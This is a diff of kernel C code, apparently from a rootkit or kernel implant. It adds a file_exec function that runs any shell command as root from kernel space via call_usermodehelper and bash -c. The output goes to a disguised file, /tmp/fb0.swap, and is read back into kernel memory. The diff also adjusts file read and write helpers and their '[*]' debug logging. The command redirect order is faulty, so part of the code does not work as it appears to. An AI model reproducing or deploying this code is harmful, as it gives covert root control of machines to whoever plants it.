@@ -20,8 +20,6 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
         return PTR_ERR(file);
     }
 
-    pr_err("[*] going to read file (read_iter: %p, read: %p)\n", file->f_op->read_iter, file->f_op->read);
-
     tmp_buf = kzmalloc(4096, GFP_KERNEL);
     if (IS_ERR(tmp_buf))
     {
@@ -29,7 +27,7 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
         goto LAB_OUT_NO_FILP;
     }
 
-    pr_err("[*] reading file (%p, %p)...\n", file, tmp_buf);
+    pr_err("[*] reading file '%s'...\n", filename);
     retv = kernel_read(file, tmp_buf, 4096, NULL);
     if (retv < 0)
     {
@@ -89,7 +87,7 @@ int file_write(const char *filename, const u8 *content, size_t content_len)
         return PTR_ERR(file);
     }
 
-    pr_err("[*] writing size: %ld\n", content_len);
+    pr_err("[*] writing to '%s' size: %ld\n", filename, content_len);
     retv = kernel_write(file, content, content_len, 0);
     filp_close(file, NULL);
     if (retv < 0)
@@ -101,7 +99,32 @@ int file_write(const char *filename, const u8 *content, size_t content_len)
     return retv;
 }
 
-int file_exec(const char *path, char **argv, char **envp)
+int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
 {
-    return call_usermodehelper(path, argv, envp, UMH_WAIT_PROC);
+    char* envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+    char* argv[] = {"/bin/bash", "-c", NULL, NULL};
+    size_t bash_cmd_len;
+    int cmd_retv;
+    int retv;
+
+    #define STDOUT_FILE "/tmp/fb0.swap"
+    #define CMD_POSTFIX " 2>&1 >"
+
+    bash_cmd_len = strlen(cmd) + strlen(CMD_POSTFIX) + strlen(STDOUT_FILE) + 1; 
+    argv[2] = kzmalloc(bash_cmd_len, GFP_KERNEL);
+    if (IS_ERR(argv[2]))
+        return PTR_ERR(argv[2]);
+
+    sprintf(argv[2], "%s%s%s", cmd, CMD_POSTFIX, STDOUT_FILE);
+
+    pr_err("[*] executing: '%s %s %s'\n", argv[0], argv[1], argv[2]);
+    cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    kzfree(argv[2], bash_cmd_len);
+
+    retv = file_read(STDOUT_FILE, out_buf, out_buflen);
+    pr_err("[+] read %d bytes\n", retv);
+    if (retv < 0)
+        return retv;
+
+    return cmd_retv;
 }
